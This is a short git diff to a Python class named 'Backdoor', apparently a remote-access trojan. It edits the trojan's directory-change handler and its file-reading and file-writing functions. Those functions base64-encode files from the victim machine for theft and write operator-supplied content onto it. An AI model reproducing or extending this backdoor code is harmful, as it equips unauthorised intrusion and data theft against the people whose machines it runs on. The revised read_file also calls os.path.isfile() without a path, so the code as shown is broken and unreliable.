@@ -36,13 +36,15 @@ class Backdoor:
         try:
             os.chdir(path)
             return "[+] Changing working directory to " + os.getcwd()
-        except FileNotFoundError:
+        except:
             return "[-] Directory not found: " + path
 
     def read_file(self, path):
-        with open(path, "rb") as f:
-            return base64.b64encode(f.read()).decode()
-
+        if os.path.isfile():
+            with open(path, "rb") as f:
+                return base64.b64encode(f.read()).decode()
+        else:
+            return (f"[-] {path} not found")
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
